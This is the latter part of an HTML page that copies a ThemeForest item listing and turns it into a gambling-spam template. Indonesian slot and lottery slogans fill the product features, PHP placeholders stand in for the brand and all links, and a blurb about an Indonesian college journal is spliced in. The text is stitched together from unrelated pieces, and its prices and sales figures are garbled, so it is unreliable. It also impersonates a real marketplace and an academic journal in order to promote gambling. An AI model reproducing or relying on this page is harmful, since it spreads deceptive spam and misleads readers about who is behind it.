                                            <ul class="author-recommended-collection__list" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_item_list&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;item_list_name&quot;:&quot;Author Recommended tokopress&quot;,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26116208,&quot;item_name&quot;:&quot;Retrave | Travel \u0026 Tour Agency Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;travel-accomodation&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:1},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26126773,&quot;item_name&quot;:&quot;Coursly | Education \u0026 Offline Course Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;education&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:2},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26416085,&quot;item_name&quot;:&quot;Sweeding | Wedding Event Invitation Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;weddings&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:3}]},&quot;item_list_id&quot;:8435762}">




                                            </ul>
                                        </div>
                                        <div bis_skin_checked="1">

                                        </div>
                                    </section>






                                    <div data-view="itemPageScrollEvents" bis_skin_checked="1"></div>
                                </div>

                                <div class="sidebar-l sidebar-right" bis_skin_checked="1">


                                    <div class="pricebox-container" bis_skin_checked="1">
                                        <div class="purchase-panel" bis_skin_checked="1">
                                            <div id="purchase-form" class="purchase-form" bis_skin_checked="1">
                                                <form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:8988002,&quot;item_name&quot;:&quot;<?php echo $BRANDS ?> e-Jurnal STIE Bhakti Pembangunan&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}" action="<?php echo $urlPath ?>" accept-charset="UTF-8" method="post">
                                                    <input type="hidden" name="authenticity_token" value="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ" autocomplete="off">
                                                    <div bis_skin_checked="1">
                                                        <div data-view="itemVariantSelector" data-id="8988002" data-cookiebot-enabled="true" bis_skin_checked="1">
                                                            <div class="purchase-form__selection" bis_skin_checked="1">
                                                                <span class="purchase-form__license-type">
                                                                    <span data-view="flyout" class="flyout">
                                                                        <span class="js-license-selector__chosen-license purchase-form__license-dropdown">Regular
                                                                            License</span>
                                                                        <div class="js-flyout__body flyout__body -padding-side-removed" bis_skin_checked="1">
                                                                            <span class="js-flyout__triangle flyout__triangle"></span>
                                                                            <div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
                                                                                <div class="js-license-selector__item license-selector__item" data-license="regular" data-name="Regular License" bis_skin_checked="1">

                                                                                    <div class="license-selector__license-type" bis_skin_checked="1">
                                                                                        <span class="t-heading -size-xxs">Regular
                                                                                            License</span>
                                                                                        <span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
                                                                                    </div>
                                                                                    <div class="license-selector__price" bis_skin_checked="1">
                                                                                        <span class="t-heading -size-m h-m0">
                                                                                            <b class="t-currency"><span class="">$77</span></b>
                                                                                        </span>
                                                                                    </div>
                                                                                    <div class="license-selector__description" bis_skin_checked="1">
                                                                                        <p class="t-body -size-m h-m0">
                                                                                            Use, by you or one client,
                                                                                            in a single end product
                                                                                            which end users <strong>are
                                                                                                not</strong> charged
                                                                                            for. The total price
                                                                                            includes the item price and
                                                                                            a buyer fee.</p>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="flyout__link" bis_skin_checked="1">
                                                                                <p class="t-body -size-m h-m0">
                                                                                    <a class="t-link -decoration-reversed" target="_blank" href="<?php echo $urlPath ?>/licenses/standard">View
                                                                                        license details</a>
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                    </span>


                                                                    <input type="hidden" name="license" id="license" value="regular" class="js-purchase-default-license" data-license="regular" autocomplete="off">
                                                                </span>

                                                                <div class="js-purchase-heading purchase-form__price t-heading -size-xxl" bis_skin_checked="1">
                                                                    <b class="t-currency"><span class="js-purchase-price">$25.215</span></b>
                                                                </div>
                                                            </div>


                                                            <div class="purchase-form__license js-purchase-license is-active" data-license="regular" bis_skin_checked="1">
                                                                <price class="js-purchase-license-prices" data-price-prepaid="$37" data-license="regular" data-price-prepaid-upgrade="$46.38" data-support-upgrade-price="$9.38" data-support-upgrade-saving="$12" data-support-extension-price="$15.63" data-support-extension-saving="$6.25" data-support-renewal-price="$10.00">
                                                                </price>
                                                            </div>

                                                            <div class="purchase-form__support" bis_skin_checked="1">
                                                                <ul class="t-icon-list -font-size-s -icon-size-s -offset-flush">
                                                                    <li class="t-icon-list__item -icon-ok">
                                                                        <span class="is-visually-hidden">Included:</span>
                                                                        <?php echo $BRANDS ?> 
                                                                    </li>
                                                                    <li class="t-icon-list__item -icon-ok">
                                                                        <span class="is-visually-hidden">Included:</span>
                                                                        BET 200 <?php echo $BRANDS ?>
                                                                    </li>
                                                                    <li class="t-icon-list__item -icon-ok">
                                                                        <span class="is-visually-hidden">Included:</span>
                                                                        SLOT GACOR <?php echo $BRANDS ?><span class="purchase-form__author-name"></span>
                                                                        <a class="t-link -decoration-reversed js-support__inclusion-link" data-view="modalAjax" href="/item_support/what_is_item_support/8988002">
                                                                            <svg width="12px" height="13px" viewBox="0 0 12 13" class="" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
                                                                                <title>More Info</title>
                                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6.5a6 6 0 1 0 12 0 6 6 0 0 0-12 0zm7.739-3.17a.849.849 0 0 1-.307.664.949.949 0 0 1-.716.273c-.273 0-.529-.102-.716-.272a.906.906 0 0 1-.307-.665c0-.256.102-.512.307-.682.187-.17.443-.273.716-.273.273 0 .528.102.716.273a.908.908 0 0 1 .307.682zm-.103 6.34-.119.46c-.34.137-.613.24-.818.307a2.5 2.5 0 0 1-.716.103c-.409 0-.733-.103-.954-.307a.953.953 0 0 1-.341-.767c0-.12 0-.256.017-.375.017-.12.05-.273.085-.426l.426-1.517a7.14 7.14 0 0 1 .103-.41c.017-.119.034-.238.034-.357a.582.582 0 0 0-.12-.41c-.085-.068-.238-.119-.46-.119-.12 0-.239.017-.34.051-.069.03-.132.047-.189.064-.042.012-.082.024-.119.038l.12-.46c.234-.102.468-.18.69-.253l.11-.037c.24-.085.478-.119.734-.119.409 0 .733.102.954.307.222.187.341.477.341.784 0 .068 0 .187-.017.34v.003a2.173 2.173 0 0 1-.085.458l-.427 1.534-.102.41v.002c-.017.119-.034.237-.034.356 0 .204.051.34.136.409.137.085.307.119.46.102a1.3 1.3 0 0 0 .359-.051c.085-.051.17-.085.272-.12z" fill="#0084B4"></path>

                                                                            </svg>

                                                                        </a>
                                                                    </li>
                                                                </ul>

                                                                <div class="purchase-form__upgrade purchase-form__upgrade--before-after-price" bis_skin_checked="1">
                                                                    <div class="purchase-form__upgrade-checkbox purchase-form__upgrade-checkbox--before-after-price" bis_skin_checked="1">
                                                                        <input type="hidden" name="support" id="support_default" value="bundle_6month" class="js-support__default" autocomplete="off">
                                                                        <input type="checkbox" name="support" id="support" value="bundle_12month" class="js-support__option">
                                                                    </div>
                                                                    <div class="purchase-form__upgrade-info" bis_skin_checked="1">
                                                                        <label class="purchase-form__label purchase-form__label--before-after-price" for="support">
                                                                            The Best Of <?php echo $BRANDS ?>
                                                                            <span class="purchase-form__price purchase-form__price--before-after-price t-heading -size-xs h-pull-right">
                                                                                <span class="js-renewal__price t-currency purchase-form__renewal-price purchase-form__renewal-price--strikethrough">$585.999</span>

                                                                                <b class="t-currency">
                                                                                    <span class="js-support__price">$85.255</span>
                                                                                </b>
                                                                            </span>
                                                                        </label>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <p class="t-body -size-m"><i><?php echo $BRANDS ?> Jurnal STIE BP merupakan Jurnal yang langsung dikelola oleh program studi yang ada di STIE Bhakti Pembangunan, program studi terdiri dari Sarjana Akuntansi, Sarjana Manajemen, Diploma Tiga Akuntansi, Diploma Tiga Manajemen Perusahaan, Magister Manajemen.</i>
                                                        </p>
                                                        <div class="purchase-form__us-dollars-notice-container" bis_skin_checked="1">
                                                            <p class="purchase-form__us-dollars-notice"><i>Price is in
                                                                    US dollars and excludes tax and handling fees</i>
                                                            </p>

                                                        </div>
                                                    </div>
                                                </form>
                                            </div>

                                        </div>

                                    </div>











                                    <div class="t-body -size-s h-text-align-center h-mt2" bis_skin_checked="1">
                                         All Rights Reserved Situs Bandar Toto <?php echo $BRANDS ?>
                                        <br>
                                        <a href="<?php echo $urlPath ?>">Contact the <?php echo $BRANDS ?> Help Team</a>
                                    </div>

                                </div>

                                <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
window.addEventListener('unload',function(e){window.scrollTo(0,0);});
//]]></script>
                            </div>

                        </div>
                    </div>


                    <div bis_skin_checked="1">


                        <footer class="global-footer">
                            <div class="grid-container -layout-wide" bis_skin_checked="1">
                                <div class="global-footer__container" bis_skin_checked="1">
                                    <nav class="global-footer-info-links">
                                        <hr class="global-footer__separator is-hidden-desktop h-mb4">

                                        <ul class="global-footer-info-links__list">
                                            <li class="global-footer-info-links__list-item">
                                                <ul class="global-footer-sublist">
                                                    <li class="global-footer-sublist__item-title">
                                                        Envato Market
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="<?php echo $urlPath ?>/hc/en-us/articles/41383541904281-Envato-Market-Terms">Terms</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="<?php echo $urlPath ?>/licenses">Licenses</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://build.envato.com">Market API</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://envato.com/market/affiliate-program/">Become
                                                            an affiliate</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://www.envato.com/cookies/">Cookies</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <button type="button" class="global-footer__text-link" data-view="cookieSettings">Cookie Settings</button>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="global-footer-info-links__list-item">
                                                <ul class="global-footer-sublist">
                                                    <li class="global-footer-sublist__item-title">
                                                        Help
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="<?php echo $urlPath ?>">Help Center</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://help.author.envato.com/hc/en-us">Authors</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="global-footer-info-links__list-item">
                                                <ul class="global-footer-sublist">
                                                    <li class="global-footer-sublist__item-title">
                                                        Our Community
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://community.envato.com">Community</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://envato.com/blog">Blog</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="<?php echo $urlPath ?>">Forums</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://community.envato.com/#/events">Meetups</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="global-footer-info-links__list-item">
                                                <ul class="global-footer-sublist">
                                                    <li class="global-footer-sublist__item-title">
                                                        Meet Envato
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://elements.envato.com/about">About Envato</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://envato.com/careers/">Careers</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://envato.com/privacy/">Privacy Policy</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://www.envato.com/privacy/my-personal-information">Do
                                                            not sell or share my personal information</a>
                                                    </li>
                                                    <li class="global-footer-sublist__item h-p0">
                                                        <a class="global-footer__text-link" href="https://envato.com/sitemap/">Sitemap</a>
                                                    </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </nav>

                                    <div class="global-footer-stats" bis_skin_checked="1">
                                        <div class="global-footer-stats__content" bis_skin_checked="1">
                                            <img class="global-footer-stats__logo" alt="TOTO SLOT" src="https://res.cloudinary.com/dxje0jyp5/image/upload/v1761050344/seo_hantu_vmraht.png">

                                            <ul class="global-footer-stats__list">
                                                <li class="global-footer-stats__list-item h-p0">
                                                    <span class="global-footer-stats__number">658.254.555</span> items
                                                    sold

                                                </li>
                                                <li class="global-footer-stats__list-item h-p0">
                                                    <span class="global-footer-stats__number">$1.222.222</span>
                                                    community earnings

                                                </li>
                                            </ul>
                                        </div>
                                        <div class="global-footer-stats__bcorp" bis_skin_checked="1">
                                            <a target="_blank" rel="noopener noreferrer" class="global-footer-bcorp-link" href="https://bcorporation.net/en-us/find-a-b-corp/company/envato">
                                                <img class="global-footer-bcorp-logo" width="50" alt="B Corp Logo" loading="lazy" src="https://public-assets.envato-static.com/assets/header-footer/logo-bcorp-e83f7da84188b8edac311fbf08eaa86634e9db7c67130cdc17837c1172c5f678.svg">
                                            </a>
                                        </div>
                                    </div>
                                </div>

                                <hr class="global-footer__separator">
                                <div class="global-footer__container" bis_skin_checked="1">
                                    <div class="global-footer-company-links" bis_skin_checked="1">
                                        <ul class="global-footer-company-links__list">
                                            <li class="global-footer-company-links__list-item">
                                                <a class="global-footer__text-link -opacity-full" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;footer nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionName&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;footer nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionName&quot;:&quot;elements_mkt-footernav&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://elements.envato.com?utm_campaign=elements_mkt-footernav" data-analytics-viewed="true">Envato Elements</a>
                                            </li>
                                            <li class="global-footer-company-links__list-item">
                                                <a class="global-footer__text-link -opacity-full" href="https://placeit.net/">Placeit by Envato</a>
                                            </li>
                                            <li class="global-footer-company-links__list-item">
                                                <a class="global-footer__text-link -opacity-full" href="https://tutsplus.com">Envato Tuts+</a>
                                            </li>
                                            <li class="global-footer-company-links__list-item">
                                                <a class="global-footer__text-link -opacity-full" href="https://envato.com/products/">All Products</a>
                                            </li>
                                            <li class="global-footer-company-links__list-item">
                                                <a class="global-footer__text-link -opacity-full" href="https://envato.com/sitemap/">Sitemap</a>
                                            </li>
                                        </ul>

                                        <hr class="global-footer__separator is-hidden-tablet-and-above h-mt3">


                                        <small class="global-footer-company-links__price-disclaimer">
                                            Price is in US dollars and excludes tax and handling fees
                                        </small>

                                        <small class="global-footer-company-links__copyright">
                                             2025 Envato Pty Ltd. Trademarks and brands are the property of their
                                            respective owners.
                                        </small>
                                    </div>
                                </div>

                            </div>
                        </footer>

                    </div>
                </div>

                <div class="is-hidden-phone" bis_skin_checked="1">
                    <div id="tooltip-magnifier" class="magnifier" bis_skin_checked="1" style="top: 740.688px; left: 110.562px; display: none;">
                        <strong>Portfoliode | Personal CV/Resume &amp; Portfolio Elementor Template Kit</strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author">author</span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"><sup>$</sup>24</span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category">Template Kits / Elementor / Creative &amp; Design</span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                    <div id="landscape-image-magnifier" class="magnifier" bis_skin_checked="1">
                        <div class="size-limiter" bis_skin_checked="1">
                        </div>
                        <strong></strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author"></span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"></span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category"></span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                    <div id="portrait-image-magnifier" class="magnifier" bis_skin_checked="1">
                        <div class="size-limiter" bis_skin_checked="1">
                        </div>
                        <strong></strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author"></span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"></span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category"></span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                    <div id="square-image-magnifier" class="magnifier" bis_skin_checked="1">
                        <div class="size-limiter" bis_skin_checked="1">
                        </div>
                        <strong></strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author"></span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"></span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category"></span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                    <div id="smart-image-magnifier" class="magnifier" bis_skin_checked="1">
                        <div class="size-limiter" bis_skin_checked="1">
                        </div>
                        <strong></strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author"></span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"></span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category"></span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                    <div id="video-magnifier" class="magnifier" bis_skin_checked="1">
                        <div class="size-limiter" bis_skin_checked="1">
                            <div class="faux-player is-hidden" bis_skin_checked="1"><img></div>
                            <div bis_skin_checked="1">
                                <div id="hover-video-preview" bis_skin_checked="1"></div>
                            </div>
                        </div>
                        <strong></strong>
                        <div class="info" bis_skin_checked="1">
                            <div class="author-category" bis_skin_checked="1">
                                by <span class="author"></span>
                            </div>
                            <div class="price" bis_skin_checked="1">
                                <span class="cost"></span>
                            </div>
                        </div>
                        <div class="footer" bis_skin_checked="1">
                            <span class="category"></span>
                            <span class="currency-tax-notice">Price is in US dollars and excludes tax and handling
                                fees</span>
                        </div>
                    </div>

                </div>
            </div>


            <div class="page__overlay" data-view="offCanvasNavToggle" data-off-canvas="close" bis_skin_checked="1">
            </div>
        </div>
    </div>



    <div data-site="themeforest" data-view="CsatSurvey" data-cookiebot-enabled="true" class="is-visually-hidden" bis_skin_checked="1">
        <div id="js-customer-satisfaction-survey" bis_skin_checked="1">
            <div class="e-modal" bis_skin_checked="1">
                <div class="e-modal__section" id="js-customer-satisfaction-survey-iframe-wrapper" bis_skin_checked="1">
                </div>
            </div>
        </div>
    </div>
    <div id="js-customer-satisfaction-popup" class="survey-popup is-visually-hidden" bis_skin_checked="1">
        <div class="h-text-align-right" bis_skin_checked="1"><a href="<?php echo $urlPath ?>" id="js-popup-close-button" class="e-alert-box__dismiss-icon"><i class="e-icon -icon-cancel"></i></a>
        </div>
        <div class="survey-popup--section" bis_skin_checked="1">
            <h2 class="t-heading h-text-align-center -size-m">Tell us what you think!</h2>
            <p>We'd like to ask you a few questions to help improve ThemeForest.</p>
        </div>
        <div class="survey-popup--section" bis_skin_checked="1">
            <a href="<?php echo $urlPath ?>" id="js-show-survey-button" class="e-btn -color-primary -size-m -width-full js-survey-popup--show-survey-button">Sure, take me to
                the survey</a>
        </div>
    </div>



    <div id="affiliate-tracker" class="is-hidden" data-view="affiliatesTracker" data-cookiebot-enabled="true" bis_skin_checked="1"></div>


    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
$(function(){viewloader.execute(Views);});
//]]></script>


    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
trimGacUaCookies()
trimGaSessionCookies()
function trimGacUaCookies(){let maxCookies=15
var gacCookies=[]
let cookies=document.cookie.split('; ')
for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
if(cookieName.startsWith('_gac_UA')){gacCookies.push([cookieName,cookieVal])}}if(gacCookies.length<=maxCookies){return}gacCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
for(let i in gacCookies){if(i<maxCookies)continue
$.removeCookie(gacCookies[i][0],{path:'/',domain:'.'+window.location.host})}}function trimGaSessionCookies(){let maxCookies=15
var gaCookies=[]
const KEEPLIST=['_ga_ZKBVC1X78F','_ga_9Z72VQCKY0']
let cookies=document.cookie.split('; ')
for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
if(cookieName.startsWith('_ga_')){if(KEEPLIST.includes(cookieName)){continue}gaCookies.push([cookieName,cookieVal])}}if(gaCookies.length<=maxCookies){return}gaCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
for(let i in gaCookies){if(i<maxCookies)continue
$.removeCookie(gaCookies[i][0],{path:'/',domain:'.'+window.location.host})}}
//]]></script>


    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">//<![CDATA[
(function(){if(typeof window.datadog_attributes!='object')window.datadog_attributes={}
window.datadog_attributes['pageType']='item:details'})()
//]]></script>


    


    <iframe name="__uspapiLocator" tabindex="-1" role="presentation" aria-hidden="true" title="Blank" style="display: none; position: absolute; width: 1px; height: 1px; top: -9999px;"></iframe><iframe tabindex="-1" role="presentation" aria-hidden="true" title="Blank" src="https://consentcdn.cookiebot.com/sdk/bc-v4.min.html" style="position: absolute; width: 1px; height: 1px; top: -9999px;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:-9999,&quot;w&quot;:1,&quot;h&quot;:1,&quot;abs_x&quot;:0,&quot;abs_y&quot;:-9999}" bis_id="fr_nfjaf2yt3zkyajcjvi02tl" bis_depth="0" bis_chainid="1"></iframe>
    <div class="js-flyout__body flyout__body -padding-side-removed" data-show="false" bis_skin_checked="1">
        <span class="js-flyout__triangle flyout__triangle"></span>
        <div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
            <div class="js-license-selector__item license-selector__item" data-license="regular" data-name="PROGRESSIVE JACKPOT" bis_skin_checked="1">

                <div class="license-selector__license-type" bis_skin_checked="1">
                    <span class="t-heading -size-xxs">Regular License</span>
                    <span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
                </div>
                <div class="license-selector__price" bis_skin_checked="1">
                    <span class="t-heading -size-m h-m0">
                        <b class="t-currency"><span class="">$21</span></b>
                    </span>
                </div>
                <div class="license-selector__description" bis_skin_checked="1">
                    <p class="t-body -size-m h-m0">Use, by you or one client, in a single end product which end users
                        <strong>are not</strong> charged for. The total price includes the item price and a buyer fee.
                    </p>
                </div>
            </div>
        </div>
        <div class="flyout__link" bis_skin_checked="1">
            <p class="t-body -size-m h-m0">
                <a class="t-link -decoration-reversed" target="_blank" href="<?php echo $urlPath ?>">View license details</a>
            </p>
        </div>
    </div><iframe height="0" width="0" style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-953691586" data-load-time="1753876666560" height="0" width="0" src="https://td.doubleclick.net/td/rul/953691586?random=1753876666537&amp;cv=11&amp;fst=1753876666537&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_x7s5fwn363kzny6xssxfbd" bis_depth="0" bis_chainid="2"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-943617023" data-load-time="1753876666627" height="0" width="0" src="https://td.doubleclick.net/td/rul/943617023?random=1753876666603&amp;cv=11&amp;fst=1753876666603&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57s1v889115050z89195929391za200zb9195929391zd9195929391&amp;gcd=13n3n3n3n5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105103161~105103163~105124543~105124545&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fthemeforest.net%2Fitem%2Fmarketica-marketplace-wordpress-theme%2F8988002%3Fsrsltid%3DAfmBOorwNEgJi-iQXu--3qzSatNlhXMhGjZ-gMFxbyMWP2LkJDdESL9b&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Marketica%20-%20eCommerce%20and%20Marketplace%20-%20WooCommerce%20WordPress%20Theme%20by%20tokopress&amp;npa=0&amp;us_privacy=1---&amp;pscdl=noapi&amp;auid=786247872.1753876602&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.183%7CGoogle%2520Chrome%3B138.0.7204.183&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=19.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config" style="display: none; visibility: hidden;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:300,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:0,&quot;abs_y&quot;:300}" bis_id="fr_ha2x32or3khbgk3c9ve5nv" bis_depth="0" bis_chainid="3"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="AW-943617023" data-load-time="1753876666634" height="0" width="0" 